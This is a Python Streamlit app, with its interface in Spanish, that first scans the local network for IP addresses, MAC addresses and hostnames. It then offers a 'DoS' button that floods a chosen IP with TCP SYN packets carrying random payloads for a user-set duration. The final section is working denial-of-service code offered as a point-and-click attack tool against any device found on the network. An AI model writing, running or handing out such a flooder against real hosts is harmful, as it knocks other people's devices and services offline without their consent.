from scapy.all import IP, TCP, Raw, send
import streamlit as st
import pandas as pd
import ipaddress
import socket
import time
import subprocess
import platform
import string
import random

try:
    from scapy.all import ARP, Ether, srp
    SCAPY_AVAILABLE = True
except Exception:
    SCAPY_AVAILABLE = False

st.set_page_config(page_title="Escáner de red - IP / MAC / Hostname", layout="wide")
st.title("🔍 Escáner de red local (IP → MAC → Hostname)")

def get_local_ip():
    """Obtiene la IP local usada para salir (no consulta servicios externos)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()

def ip_list_from_local(prefix_len=24):
    local_ip = get_local_ip()
    net = ipaddress.ip_network(f"{local_ip}/{prefix_len}", strict=False)
    return [str(ip) for ip in net.hosts()]

def get_mac_address_scapy(ip, timeout=2):
    """Devuelve MAC o None usando Scapy (ARP)."""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                     timeout=timeout,
                     verbose=0)
        for snd, rcv in ans:
            return rcv.hwsrc
    except Exception:
        return None
    return None

def ping_ip(ip, timeout=1000):
    param = "-n" if platform.system().lower()=="windows" else "-c"

    try:
        if platform.system().lower() == "windows":
            subprocess.run(["ping", param, "1", "-w", str(timeout), ip],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            subprocess.run(["ping", param, "1", ip],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def get_mac_from_arp_cache(ip):
    try:
        if platform.system().lower() == "windows":
            out = subprocess.check_output(["arp", "-a"], stderr=subprocess.DEVNULL, text=True)
            
            for line in out.splitlines():
                if ip in line:
                    parts = line.split()
                    
                    if len(parts) >= 2:
                        mac = parts[1]
                        return mac
        else:
            out = subprocess.check_output(["arp", "-n"], stderr=subprocess.DEVNULL, text=True)
            for line in out.splitlines():
                if ip in line:
                    parts = line.split()
                    
                    for p in parts:
                        if ":" in p and len(p.split(":")) == 6:
                            return p
    except Exception:
        pass
    return None

def get_device_name(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except (socket.herror, socket.gaierror):
        return ""

col_l, col_r = st.columns([3, 1])

with col_l:
    st.markdown("### Parámetros de escaneo")
    prefix_len = st.selectbox("Máscara de red (/prefix)", options=[24, 16, 28], index=0)
    timeout = st.slider("Timeout ARP/ping (segundos)", min_value=1, max_value=5, value=1)
    max_hosts_show = st.number_input("Máx. resultados a mostrar (tabla)", min_value=10, max_value=1000, value=200)

with col_r:
    st.markdown("### Opciones")
    use_scapy = st.checkbox("Usar Scapy/ARP (más preciso)", value=SCAPY_AVAILABLE)
    if not SCAPY_AVAILABLE:
        st.info("Scapy no disponible en el entorno: se usará método fallback (ping + ARP).")
    run_btn = st.button("▶ Iniciar escaneo")

st.write("---")


if "scanning" not in st.session_state:
    st.session_state.scanning = False
if "results" not in st.session_state:
    st.session_state.results = []

progress_bar = st.progress(0)
status_text = st.empty()
table_place = st.empty()
time_place = st.empty()

def scan_network_and_update(prefix_len, use_scapy_flag, arp_timeout):
    ips = ip_list_from_local(prefix_len=prefix_len)
    total = len(ips)
    found = []

    start = time.time()
    for idx, ip in enumerate(ips, start=1):
        mac = None
        if use_scapy_flag and SCAPY_AVAILABLE:
            mac = get_mac_address_scapy(ip, timeout=arp_timeout)
        else:
            ping_ip(ip, timeout=1000)
            mac = get_mac_from_arp_cache(ip)

        if mac:
            hostname = get_device_name(ip)
            found.append({"IP": ip, "MAC": mac, "Device": hostname})

        
        pct = int((idx/total) * 100)
        progress_bar.progress(pct)
        status_text.text(f"Escaneados: {idx}/{total} ({(idx/total)*100:.2f}%)  —  Últimos: {ip}  —  Encontrados: {len(found)}")
        
        if found:
            df = pd.DataFrame(found).drop_duplicates(subset="IP").sort_values("IP").reset_index(drop=True)
            table_place.dataframe(df.head(max_hosts_show), use_container_width=True)
        else:
            table_place.write("No hay dispositivos encontrados todavía.")
        time_place.write(f"Tiempo transcurrido: {time.time()-start:.1f} s")

        time.sleep(0.01)

    return found

if run_btn and not st.session_state.scanning:
    st.session_state.scanning = True
    st.session_state.results = []

    try:
        local_ip = get_local_ip()
        network = ipaddress.ip_network(f"{local_ip}/{prefix_len}", strict=False)
        st.info(f"Escaneando red {network} — {len(list(network.hosts()))} hosts")
    except Exception as e:
        st.error(f"No se pudo determinar la red local: {e}")
        st.session_state.scanning = False

    if st.session_state.scanning:
        results = scan_network_and_update(prefix_len, use_scapy, timeout)
        st.session_state.results = results
        st.session_state.scanning = False

        if results:
            df_final = pd.DataFrame(results).drop_duplicates(subset="IP").sort_values("IP").reset_index(drop=True)
            st.success(f"✅ Escaneo completado. {len(df_final)} dispositivos detectados.")
            st.dataframe(df_final, use_container_width=True)
        else:
            st.warning("⚠️ Escaneo completado. No se detectaron dispositivos.")

elif st.session_state.results:
    df_prev = pd.DataFrame(st.session_state.results).drop_duplicates(subset="IP").sort_values("IP").reset_index(drop=True)
    st.write("Resultados previos:")
    st.dataframe(df_prev.head(max_hosts_show), use_container_width=True)
else:
    st.info("Pulsa 'Iniciar escaneo' para buscar dispositivos en la red local.")

select_ip = st.selectbox("Selecciona una IP", options=ip_list_from_local())
timer = st.number_input("Duración del ataque (s.)", min_value=10, max_value=300, value=20)

def random_string(length):
    """Genera una cadena aleatoria de longitud especificada."""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def dos_attack_with_scapy(target_ip, duration):

    end_time = time.time() + duration

    while time.time() < end_time:
        payload = random_string(1024)

        ip_layer = IP(dst=target_ip)
        tcp_layer = TCP(dport=80, flags="S")
        raw_layer = Raw(load=payload)

        packet = ip_layer / tcp_layer / raw_layer
        send(packet, verbose=0)

if st.button("DoS"):
    st.info("Escaneo inciado...")
    dos_attack_with_scapy(select_ip, duration=timer)
    st.success(f"Ataque finalizado a la Ip: {select_ip} durante {timer} s.")

